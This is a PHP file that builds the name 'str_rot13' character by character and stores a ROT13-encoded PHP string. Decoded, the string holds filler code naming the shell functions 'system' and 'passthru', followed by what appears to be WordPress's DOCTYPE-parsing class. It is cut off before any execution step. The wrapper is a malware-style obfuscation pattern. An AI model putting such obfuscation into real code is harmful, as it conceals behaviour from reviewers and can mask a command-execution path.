<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGZY NCV: JC_UGZY_Qbpglcr_Vasb pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 * @fvapr 6.7.0
 */

/**
 * Pber pynff hfrq ol gur UGZY NCV gb ercerfrag n QBPGLCR qrpynengvba.
 *
 * Guvf pynff cnefrf QBPGLCR gbxraf sbe gur shyy cnefre va gur UGZY Cebprffbe.
 * Zbfg pbqr vagrenpgvat jvgu UGZY jba'g arrq gb cnefr QBPGLCR qrpynengvbaf;
 * gur UGZY Cebprffbe vf bar rkprcgvba. Pbafhyg gur UGZY Cebprffbe sbe cebcre
 * cnefvat bs na UGZY qbphzrag.
 *
 * N QBPGLCR qrpynengvba znl vaqvpngr vgf qbphzrag pbzcngvovyvgl zbqr, juvpu vzcnpgf
 * gur fgehpgher bs gur sbyybjvat UGZY nf jryy nf gur orunivbe bs PFF pynff fryrpgbef.
 * Gurer ner guerr cbffvoyr zbqrf:
 *
 *  - \"ab-dhvexf\" naq \"yvzvgrq-dhvexf\" zbqrf (nyfb pnyyrq \"fgnaqneqf zbqr\").
 *  - \"dhvexf\" zbqr.
 *
 * Gurfr zbqrf zbfgyl qrgrezvar jurgure PFF pynff anzr fryrpgbef zngpu inyhrf va gur
 * UGZY `pynff` nggevohgr va na NFPVV-pnfr-vafrafvgvir jnl (dhvexf zbqr), be jurgure
 * gurl zngpu bayl jura olgr-sbe-olgr vqragvpny (ab-dhvexf zbqr).
 *
 * Nyy UGZY qbphzragf fubhyq fgneg jvgu gur fgnaqneq UGZY5 QBPGLCR: `<!QBPGLCR ugzy>`.
 *
 * > QBPGLCRf ner erdhverq sbe yrtnpl ernfbaf. Jura bzvggrq, oebjfref graq gb hfr n qvssrerag
 * > eraqrevat zbqr gung vf vapbzcngvoyr jvgu fbzr fcrpvsvpngvbaf. Vapyhqvat gur QBPGLCR va n
 * > qbphzrag rafherf gung gur oebjfre znxrf n orfg-rssbeg nggrzcg ng sbyybjvat gur
 * > eryrinag fcrpvsvpngvbaf.
 *
 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gur-qbpglcr
 *
 * QBPGLCR qrpynengvbaf pbzcevfr sbhe cebcregvrf: n anzr, choyvp vqragvsvre, flfgrz vqragvsvre,
 * naq na vaqvpngvba bs juvpu qbphzrag pbzcngnovyvgl zbqr gurl jbhyq vzcyl vs na UGZY cnefre
 * unqa'g nyernql qrgrezvarq vg sebz bgure vasbezngvba.
 *
 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gur-vavgvny-vafregvba-zbqr
 *
 * Uvfgbevpnyyl, gur QBPGLCR qrpynengvba jnf hfrq va FTZY qbphzragf gb vafgehpg n cnefre ubj
 * gb vagrecerg gur inevbhf gntf naq ragvgvrf jvguva n qbphzrag. Vgf ebyr va UGZY qviretrq
 * sebz ubj vg jnf hfrq va FTZY naq ab zrnavat fubhyq or onpx-ernq vagb UGZY onfrq ba ubj vg
 * vf hfrq va FTZY, KZY, be KUGZY qbphzragf.
 *
 * @frr uggcf://jjj.vfb.bet/fgnaqneq/16387.ugzy
 *
 * @fvapr 6.7.0
 *
 * @frr JC_UGZY_Cebprffbe
 */
pynff JC_UGZY_Qbpglcr_Vasb {
	/**
	 * Anzr bs gur QBPGLCR: fubhyq or \"ugzy\" sbe UGZY qbphzragf.
	 *
	 * Guvf inyhr fubhyq or pbafvqrerq \"ernq bayl\" naq abg zbqvsvrq.
	 *
	 * Uvfgbevpnyyl gur QBPGLCR anzr vaqvpngrf anzr bs gur qbphzrag'f ebbg ryrzrag.
	 *
	 *     <!QBPGLCR ugzy>
	 *               ╰──┴── anzr vf \"ugzy\".
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gbxravmngvba
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat|ahyy
	 */
	choyvp $anzr = ahyy;

	/**
	 * Choyvp vqragvsvre bs gur QBPGLCR.
	 *
	 * Guvf inyhr fubhyq or pbafvqrerq \"ernq bayl\" naq abg zbqvsvrq.
	 *
	 * Gur choyvp vqragvsvre vf bcgvbany naq fubhyq abg nccrne va UGZY qbphzragf.
	 * N `ahyy` inyhr vaqvpngrf gung ab choyvp vqragvsvre jnf cerfrag va gur QBPGLCR.
	 *
	 * Uvfgbevpnyyl gur cerfrapr bs gur choyvp vqragvsvre vaqvpngrq gung n qbphzrag
	 * jnf zrnag gb or funerq orgjrra pbzchgre flfgrzf naq gur inyhr vaqvpngrq gb n
	 * xabjyrqtrnoyr cnefre ubj gb svaq gur eryrinag qbphzrag glcr qrsvavgvba (QGQ).
	 *
	 *     <!QBPGLCR ugzy CHOYVP \"choyvp vq tbrf urer va dhbgrf\">
	 *               │  │         ╰─── choyvp vqragvsvre ─────╯
	 *               ╰──┴── anzr vf \"ugzy\".
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gbxravmngvba
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat|ahyy
	 */
	choyvp $choyvp_vqragvsvre = ahyy;

	/**
	 * Flfgrz vqragvsvre bs gur QBPGLCR.
	 *
	 * Guvf inyhr fubhyq or pbafvqrerq \"ernq bayl\" naq abg zbqvsvrq.
	 *
	 * Gur flfgrz vqragvsvre vf bcgvbany naq fubhyq abg nccrne va UGZY qbphzragf.
	 * N `ahyy` inyhr vaqvpngrf gung ab flfgrz vqragvsvre jnf cerfrag va gur QBPGLCR.
	 *
	 * Uvfgbevpnyyl gur flfgrz vqragvsvre fcrpvsvrq jurer n eryrinag qbphzrag glcr
	 * qrpynengvba sbe gur tvira qbphzrag vf fgberq naq znl or ergevrirq.
	 *
	 *     <!QBPGLCR ugzy FLFGRZ \"flfgrz vq tbrf urer va dhbgrf\">
	 *               │  │         ╰──── flfgrz vqragvsvre ────╯
	 *               ╰──┴── anzr vf \"ugzy\".
	 *
	 * Vs n choyvp vqragvsvre jrer cebivqrq vg jbhyq vaqvpngr gb n xabjyrqtrnoyr
	 * cnefre ubj gb vagrecerg gur flfgrz vqragvsvre.
	 *
	 *     <!QBPGLCR ugzy CHOYVP \"choyvp vq tbrf urer va dhbgrf\" \"flfgrz vq tbrf urer va dhbgrf\">
	 *               │  │         ╰─── choyvp vqragvsvre ─────╯   ╰──── flfgrz vqragvsvre ────╯
	 *               ╰──┴── anzr vf \"ugzy\".
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gbxravmngvba
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat|ahyy
	 */
	choyvp $flfgrz_vqragvsvre = ahyy;

	/**
	 * Juvpu qbphzrag pbzcngnovyvgl zbqr guvf QBPGLCR qrpynengvba vaqvpngrf.
	 *
	 * Guvf inyhr fubhyq or pbafvqrerq \"ernq bayl\" naq abg zbqvsvrq.
	 *
	 * Jura na UGZY cnefre unf abg nyernql frg gur qbphzrag pbzcngnovyvgl zbqr,
	 * (r.t. \"dhvexf\" be \"ab-dhvexf\" zbqr), vg jvyy vasre vs sebz gur cebcregvrf
	 * bs gur nccebcevngr QBPGLCR qrpynengvba, vs bar rkvfgf. Gur QBPGLCR pna
	 * vaqvpngr bar bs guerr cbffvoyr qbphzrag pbzcngnovyvgl zbqrf:
	 *
	 *  - \"ab-dhvexf\" naq \"yvzvgrq-dhvexf\" zbqrf (nyfb pnyyrq \"fgnaqneqf\" zbqr).
	 *  - \"dhvexf\" zbqr (nyfb pnyyrq `PFF1Pbzcng` zbqr).
	 *
	 * Na nccebcevngr QBPGLCR vf bar rapbhagrerq va gur \"vavgvny\" vafregvba zbqr,
	 * orsber gur UGZY ryrzrag unf orra bcrarq naq orsber svaqvat nal bgure
	 * QBPGLCR qrpynengvba gbxraf.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#gur-vavgvny-vafregvba-zbqr
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat Bar bs \"ab-dhvexf\", \"yvzvgrq-dhvexf\", be \"dhvexf\".
	 */
	choyvp $vaqvpngrq_pbzcngnovyvgl_zbqr;

	/**
	 * Pbafgehpgbe.
	 *
	 * Guvf pynff fubhyq abg or vafgnagvngrq qverpgyl.
	 * Hfr gur fgngvp {@frr frys::sebz_qbpglcr_gbxra} zrgubq vafgrnq.
	 *
	 * Gur nethzragf gb guvf pbafgehpgbe pbeerfcbaq gb gur \"QBPGLCR gbxra\"
	 * nf qrsvarq va gur UGZY fcrpvsvpngvba.
	 *
	 * > QBPGLCR gbxraf unir n anzr, n choyvp vqragvsvre, n flfgrz vqragvsvre,
	 * > naq n sbepr-dhvexf synt. Jura n QBPGLCR gbxra vf perngrq, vgf anzr, choyvp vqragvsvre,
	 * > naq flfgrz vqragvsvre zhfg or znexrq nf zvffvat (juvpu vf n qvfgvapg fgngr sebz gur
	 * > rzcgl fgevat), naq gur sbepr-dhvexf synt zhfg or frg gb bss (vgf bgure fgngr vf ba).
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#gbxravmngvba
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat|ahyy $anzr              Anzr bs gur QBPGLCR.
	 * @cnenz fgevat|ahyy $choyvp_vqragvsvre Choyvp vqragvsvre bs gur QBPGLCR.
	 * @cnenz fgevat|ahyy $flfgrz_vqragvsvre Flfgrz vqragvsvre bs gur QBPGLCR.
	 * @cnenz obby        $sbepr_dhvexf_synt Jurgure gur sbepr-dhvexf synt vf frg sbe gur gbxra.
	 */
	cevingr shapgvba __pbafgehpg(
		?fgevat $anzr,
		?fgevat $choyvp_vqragvsvre,
		?fgevat $flfgrz_vqragvsvre,
		obby $sbepr_dhvexf_synt
	) {
		$guvf->anzr              = $anzr;
		$guvf->choyvp_vqragvsvre = $choyvp_vqragvsvre;
		$guvf->flfgrz_vqragvsvre = $flfgrz_vqragvsvre;

		/*
		 * > Vs gur QBPGLCR gbxra zngpurf bar bs gur pbaqvgvbaf va gur sbyybjvat yvfg,
		 * > gura frg gur Qbphzrag gb dhvexf zbqr:
		 */

		/*
		 * > Gur sbepr-dhvexf synt vf frg gb ba.
		 */
		vs ( $sbepr_dhvexf_synt ) {
			$guvf->vaqvpngrq_pbzcngnovyvgl_zbqr = 'dhvexf';
			erghea;
		}

		/*
		 * Abezngvir qbphzragf jvyy pbagnva gur yvgreny `<!QBPGLCR ugzy>` jvgu ab
		 * choyvp be flfgrz vqragvsvref; fubeg-pvephvg gb nibvq rkgen cnefvat.
		 */
		vs ( 'ugzy' === $anzr && ahyy === $choyvp_vqragvsvre && ahyy === $flfgrz_vqragvsvre ) {
			$guvf->vaqvpngrq_pbzcngnovyvgl_zbqr = 'ab-dhvexf';
			erghea;
		}

		/*
		 * > Gur anzr vf abg \"ugzy\".
		 *
		 * Gur gbxravmre zhfg ercbeg gur anzr va ybjre pnfr rira vs cebivqrq va
		 * gur qbphzrag va hccre pnfr; guhf ab pbairefvba vf erdhverq urer.
		 */
		vs ( 'ugzy' !== $anzr ) {
			$guvf->vaqvpngrq_pbzcngnovyvgl_zbqr = 'dhvexf';
			erghea;
		}

		/*
		 * Frg hc fbzr inevnoyrf gb unaqyr gur erfg bs gur pbaqvgvbaf.
		 *
		 * > frg...gur choyvp vqragvsvre...gb...gur rzcgl fgevat vs gur choyvp vqragvsvre jnf zvffvat.
		 * > frg...gur flfgrz vqragvsvre...gb...gur rzcgl fgevat vs gur flfgrz vqragvsvre jnf zvffvat.
		 * >
		 * > Gur flfgrz vqragvsvre naq choyvp vqragvsvre fgevatf zhfg or pbzcnerq...
		 * > va na NFPVV pnfr-vafrafvgvir znaare.
		 * >
		 * > N flfgrz vqragvsvre jubfr inyhr vf gur rzcgl fgevat vf abg pbafvqrerq zvffvat
		 * > sbe gur checbfrf bs gur pbaqvgvbaf nobir.
		 */
		$flfgrz_vqragvsvre_vf_zvffvat = ahyy === $flfgrz_vqragvsvre;
		$choyvp_vqragvsvre            = ahyy === $choyvp_vqragvsvre ? '' : fgegbybjre( $choyvp_vqragvsvre );
		$flfgrz_vqragvsvre            = ahyy === $flfgrz_vqragvsvre ? '' : fgegbybjre( $flfgrz_vqragvsvre );

		/*
		 * > Gur choyvp vqragvsvre vf frg gb…
		 */
		vs (
			'-//j3b//qgq j3 ugzy fgevpg 3.0//ra//' === $choyvp_vqragvsvre ||
			'-/j3p/qgq ugzy 4.0 genafvgvbany/ra' === $choyvp_vqragvsvre ||
			'ugzy' === $choyvp_vqragvsvre
		) {
			$guvf->vaqvpngrq_pbzcngnovyvgl_zbqr = 'dhvexf';
			erghea;
		}

		/*
		 * > Gur flfgrz vqragvsvre vf frg gb…
		 */
		vs ( 'uggc://jjj.voz.pbz/qngn/qgq/i11/vozkugzy1-genafvgvbany.qgq' === $flfgrz_vqragvsvre ) {
			$guvf->vaqvpngrq_pbzcngnovyvgl_zbqr = 'dhvexf';
			erghea;
		}

		/*
		 * Nyy bs gur sbyybjvat pbaqvgvbaf qrcraq ba zngpuvat gur choyvp vqragvsvre.
		 * Vs gur choyvp vqragvsvre vf rzcgl, abar bs gur sbyybjvat pbaqvgvbaf jvyy zngpu.
		 */
		vs ( '' === $choyvp_vqragvsvre ) {
			$guvf->vaqvpngrq_pbzcngnovyvgl_zbqr = 'ab-dhvexf';
			erghea;
		}

		/*
		 * > Gur choyvp vqragvsvre fgnegf jvgu…
		 *
		 * @gbqb Bcgvzvmr guvf zngpuvat. Vg fubhyqa'g or n ynetr birenyy cresbeznapr vffhr,
		 *       ubjrire, nf bayl n fvatyr QBPGLCR qrpynengvba gbxra fubhyq rire or cnefrq,
		 *       naq abezngvir qbphzragf jvyy unir rkvgrq orsber ernpuvat guvf pbaqvgvba.
		 */
		vs (
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '+//fvyznevy//qgq ugzy ceb i0e11 19970101//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//nf//qgq ugzy 3.0 nfjrqvg + rkgrafvbaf//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//nqinfbsg ygq//qgq ugzy 3.0 nfjrqvg + rkgrafvbaf//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy 2.0 yriry 1//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy 2.0 yriry 2//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy 2.0 fgevpg yriry 1//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy 2.0 fgevpg yriry 2//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy 2.0 fgevpg//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy 2.0//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy 2.1r//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy 3.0//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy 3.2 svany//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy 3.2//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy 3//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy yriry 0//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy yriry 1//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy yriry 2//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy yriry 3//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy fgevpg yriry 0//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy fgevpg yriry 1//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy fgevpg yriry 2//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy fgevpg yriry 3//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy fgevpg//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//vrgs//qgq ugzy//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//zrgevhf//qgq zrgevhf cerfragngvbany//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//zvpebfbsg//qgq vagrearg rkcybere 2.0 ugzy fgevpg//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//zvpebfbsg//qgq vagrearg rkcybere 2.0 ugzy//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//zvpebfbsg//qgq vagrearg rkcybere 2.0 gnoyrf//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//zvpebfbsg//qgq vagrearg rkcybere 3.0 ugzy fgevpg//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//zvpebfbsg//qgq vagrearg rkcybere 3.0 ugzy//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//zvpebfbsg//qgq vagrearg rkcybere 3.0 gnoyrf//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//argfpncr pbzz. pbec.//qgq ugzy//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//argfpncr pbzz. pbec.//qgq fgevpg ugzy//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, \"-//b'ervyyl naq nffbpvngrf//qgq ugzy 2.0//\" ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, \"-//b'ervyyl naq nffbpvngrf//qgq ugzy rkgraqrq 1.0//\" ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, \"-//b'ervyyl naq nffbpvngrf//qgq ugzy rkgraqrq erynkrq 1.0//\" ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//fd//qgq ugzy 2.0 ubgzrgny + rkgrafvbaf//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//fbsgdhnq fbsgjner//qgq ubgzrgny ceb 6.0::19990601::rkgrafvbaf gb ugzy 4.0//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//fbsgdhnq//qgq ubgzrgny ceb 4.0::19971010::rkgrafvbaf gb ugzy 4.0//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//fcltynff//qgq ugzy 2.0 rkgraqrq//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//fha zvpebflfgrzf pbec.//qgq ubgwnin ugzy//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//fha zvpebflfgrzf pbec.//qgq ubgwnin fgevpg ugzy//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy 3 1995-03-24//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy 3.2 qensg//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy 3.2 svany//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy 3.2//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy 3.2f qensg//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy 4.0 senzrfrg//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy 4.0 genafvgvbany//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy rkcrevzragny 19960712//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy rkcrevzragny 970421//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq j3 ugzy//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3b//qgq j3 ugzy 3.0//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//jrogrpuf//qgq zbmvyyn ugzy 2.0//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//jrogrpuf//qgq zbmvyyn ugzy//' )
		) {
			$guvf->vaqvpngrq_pbzcngnovyvgl_zbqr = 'dhvexf';
			erghea;
		}

		/*
		 * > Gur flfgrz vqragvsvre vf zvffvat naq gur choyvp vqragvsvre fgnegf jvgu…
		 */
		vs (
			$flfgrz_vqragvsvre_vf_zvffvat && (
				fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy 4.01 senzrfrg//' ) ||
				fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy 4.01 genafvgvbany//' )
			)
		) {
			$guvf->vaqvpngrq_pbzcngnovyvgl_zbqr = 'dhvexf';
			erghea;
		}

		/*
		 * > Bgurejvfr, vs gur QBPGLCR gbxra zngpurf bar bs gur pbaqvgvbaf va
		 * > gur sbyybjvat yvfg, gura frg gur Qbphzrag gb yvzvgrq-dhvexf zbqr.
		 */

		/*
		 * > Gur choyvp vqragvsvre fgnegf jvgu…
		 */
		vs (
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq kugzy 1.0 senzrfrg//' ) ||
			fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq kugzy 1.0 genafvgvbany//' )
		) {
			$guvf->vaqvpngrq_pbzcngnovyvgl_zbqr = 'yvzvgrq-dhvexf';
			erghea;
		}

		/*
		 * > Gur flfgrz vqragvsvre vf abg zvffvat naq gur choyvp vqragvsvre fgnegf jvgu…
		 */
		vs (
			! $flfgrz_vqragvsvre_vf_zvffvat && (
				fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy 4.01 senzrfrg//' ) ||
				fge_fgnegf_jvgu( $choyvp_vqragvsvre, '-//j3p//qgq ugzy 4.01 genafvgvbany//' )
			)
		) {
			$guvf->vaqvpngrq_pbzcngnovyvgl_zbqr = 'yvzvgrq-dhvexf';
			erghea;
		}

		$guvf->vaqvpngrq_pbzcngnovyvgl_zbqr = 'ab-dhvexf';
	}

	/**
	 * Perngrf n JC_UGZY_Qbpglcr_Vasb vafgnapr ol cnefvat n enj QBPGLCR qrpynengvba gbxra.
	 *
	 * Hfr guvf zrgubq gb cnefr n QBPGLCR qrpynengvba gbxra naq trg npprff gb vgf cebcregvrf
	 * ivn gur erghearq JC_UGZY_Qbpglcr_Vasb pynff vafgnapr. Gur cebivqrq vachg zhfg cnefr
	 * cebcreyl nf n QBPGLCR qrpynengvba, gubhtu vg zhfg abg ercerfrag n inyvq QBPGLCR.
	 *
	 * Rknzcyr:
	 *
	 *     // Abezngvir UGZY QBPGLCR qrpynengvba.
	 *     $qbpglcr = JC_UGZY_Qbpglcr_Vasb::sebz_qbpglcr_gbxra( '<!QBPGLCR ugzy>' );
	 *     'ab-dhvexf' === $qbpglcr->vaqvpngrq_pbzcngnovyvgl_zbqr;
	 *
	 *     // N abafrafvpny QBPGLCR vf fgvyy inyvq, naq jvyy vaqvpngr \"dhvexf\" zbqr.
	 *     $qbpglcr = JC_UGZY_Qbpglcr_Vasb::sebz_qbpglcr_gbxra( '<!qbpglcrWFBA FVYYL \"abafrafr\'>' );
	 *     'dhvexf' === $qbpglcr->vaqvpngrq_pbzcngnovyvgl_zbqr;
	 *
	 *     // Grkghny dhvexf cerfrag va enj UGZY ner unaqyrq nccebcevngryl.
	 *     $qbpglcr = JC_UGZY_Qbpglcr_Vasb::sebz_qbpglcr_gbxra( \"<!QBPGLCR\augzy\a>\" );
	 *     'ab-dhvexf' === $qbpglcr->vaqvpngrq_pbzcngnovyvgl_zbqr;
	 *
	 *     // Nalguvat bgure guna n cebcre QBPGLCR qrpynengvba gbxra snvyf gb cnefr.
	 *     ahyy === JC_UGZY_Qbpglcr_Vasb::sebz_qbpglcr_gbxra( ' <!QBPGLCR>' );
	 *     ahyy === JC_UGZY_Qbpglcr_Vasb::sebz_qbpglcr_gbxra( '<!QBPGLCR ><c>' );
	 *     ahyy === JC_UGZY_Qbpglcr_Vasb::sebz_qbpglcr_gbxra( '<!GLCRQBP>' );
	 *     ahyy === JC_UGZY_Qbpglcr_Vasb::sebz_qbpglcr_gbxra( 'ugzy' );
	 *     ahyy === JC_UGZY_Qbpglcr_Vasb::sebz_qbpglcr_gbxra( '<?kzy irefvba=\"1.0\" rapbqvat=\"HGS-8\" ?>' );
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $qbpglcr_ugzy Gur pbzcyrgr enj QBPGLCR UGZY fgevat, r.t. `<!QBPGLCR ugzy>`.
	 *
	 * @erghea JC_UGZY_Qbpglcr_Vasb|ahyy N JC_UGZY_Qbpglcr_Vasb vafgnapr jvyy or erghearq vs gur
	 *                                   cebivqrq QBPGLCR UGZY vf n inyvq QBPGLCR. Bgurejvfr, ahyy.
	 */
	choyvp fgngvp shapgvba sebz_qbpglcr_gbxra( fgevat $qbpglcr_ugzy ): ?frys {
		$qbpglcr_anzr      = ahyy;
		$qbpglcr_choyvp_vq = ahyy;
		$qbpglcr_flfgrz_vq = ahyy;

		$raq = fgeyra( $qbpglcr_ugzy ) - 1;

		/*
		 * Guvf cnefre pbzovarf gur ehyrf sbe cnefvat QBPGLCR gbxraf sbhaq va gur UGZY
		 * fcrpvsvpngvba sbe gur QBPGLCR eryngrq gbxravmre fgngrf.
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/#qbpglcr-fgngr
		 */

		/*
		 * - Inyvq QBPGLCR UGZY gbxra zhfg or ng yrnfg `<!QBPGLCR>` nffhzvat n pbzcyrgr gbxra abg
		 *   raqvat va raq-bs-svyr.
		 * - Vg zhfg fgneg jvgu na NFPVV pnfr-vafrafvgvir zngpu sbe `<!QBPGLCR`.
		 * - Gur bayl bppheerapr bs `>` zhfg or gur svany olgr va gur UGZY fgevat.
		 */
		vs (
			$raq < 9 ||
			0 !== fhofge_pbzcner( $qbpglcr_ugzy, '<!QBPGLCR', 0, 9, gehr )
		) {
			erghea ahyy;
		}

		$ng = 9;
		// Vf gurer bar naq bayl bar `>`?
		vs ( '>' !== $qbpglcr_ugzy[ $raq ] || ( fgepfca( $qbpglcr_ugzy, '>', $ng ) + $ng ) < $raq ) {
			erghea ahyy;
		}

		/*
		 * Cresbez arjyvar abeznyvmngvba naq rafher gur $raq inyhr vf pbeerpg nsgre abeznyvmngvba.
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/#cercebprffvat-gur-vachg-fgernz
		 * @frr uggcf://vasen.fcrp.jungjt.bet/#abeznyvmr-arjyvarf
		 */
		$qbpglcr_ugzy = fge_ercynpr( \"\e\a\", \"\a\", $qbpglcr_ugzy );
		$qbpglcr_ugzy = fge_ercynpr( \"\e\", \"\a\", $qbpglcr_ugzy );
		$raq          = fgeyra( $qbpglcr_ugzy ) - 1;

		/*
		 * Va guvf fgngr, gur qbpglcr gbxra unf orra sbhaq naq vgf \"pbagrag\" bcgvbanyyl vapyhqvat gur
		 * anzr, choyvp vqragvsvre, naq flfgrz vqragvsvre vf orgjrra gur pheerag cbfvgvba naq gur raq.
		 *
		 *     \"<!QBPGLCR...qrpynengvba...>\"
		 *               ╰─ $ng           ╰─ $raq
		 *
		 * Vg'f nyfb cbffvoyr gung gur qrpynengvba cneg vf rzcgl.
		 *
		 *               ╭─ $ng
		 *     \"<!QBPGLCR>\"
		 *               ╰─ $raq
		 *
		 * Ehyrf sbe cnefvat \">\" juvpu grezvangrf gur QBPGLCR qb abg arrq gb or pbafvqrerq nf gurl
		 * unir orra unaqyrq nobir va gur pbaqvgvba gung gur cebivqrq QBPGLCR UGZY zhfg pbagnva
		 * rknpgyl bar \">\" punenpgre va gur svany cbfvgvba.
		 */

		/*
		 *
		 * Cnefvat rssrpgviryl ortvaf va \"Orsber QBPGLCR anzr fgngr\". Vtaber juvgrfcnpr naq
		 * cebprrq gb gur arkg fgngr.
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/#orsber-qbpglcr-anzr-fgngr
		 */
		$ng += fgefca( $qbpglcr_ugzy, \" \g\a\s\e\", $ng );

		vs ( $ng >= $raq ) {
			erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, gehr );
		}

		$anzr_yratgu  = fgepfca( $qbpglcr_ugzy, \" \g\a\s\e\", $ng, $raq - $ng );
		$qbpglcr_anzr = fge_ercynpr( \"\0\", \"\h{SSSQ}\", fgegbybjre( fhofge( $qbpglcr_ugzy, $ng, $anzr_yratgu ) ) );

		$ng += $anzr_yratgu;
